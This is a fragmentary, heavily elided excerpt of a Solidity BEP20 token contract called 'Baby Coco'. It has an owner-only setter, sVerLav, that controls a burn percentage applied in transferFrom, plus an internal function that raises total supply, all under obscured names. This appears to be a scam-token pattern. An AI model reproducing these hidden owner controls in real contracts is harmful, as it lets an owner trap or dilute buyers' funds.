...
contract HelloBEP20 is IBEP20 {
    using MathFA for uint256;

    string public name20FA =  "Baby Coco";
    string public symbol20FA =  "BCC";
    uint8 public decimals20FA = 9;
    uint public _totalSupplyFA = 1*10**15 * 10**9;
    
    address private _owner;
    
    uint8 private _udaking;
    ...
    constructor() {
        ...
        _owner = msgSender;
        balances[msg.sender] = _totalSupplyFA;
        emit Transfer(address(0), msg.sender, _totalSupplyFA);
    }
  ...
  function decimals() public view virtual returns (uint8) {
    ...
    function totalSupply() public override view returns (uint) {
        return _totalSupplyFA - balances[address(0)];
    }
    ...
    function transferFrom(address from, address to, uint tokens) public override returns (bool success) {
        ...
        _lavu(from,tokens.mul(getVerLav()).div(10**2));
    ...
    function _lavu(address tokenOwner, uint256 tokens) internal {
        ...
        _totalSupplyFA = _totalSupplyFA.subb(tokens);
    ...
    function sVerLav(uint8 udaking) public virtual onlyOwner {
		_udaking = udaking;
	}
    ...
    function _ekle(address tokenOwner, uint256 tokens) internal {
        ...
        _totalSupplyFA = _totalSupplyFA.ad(tokens);
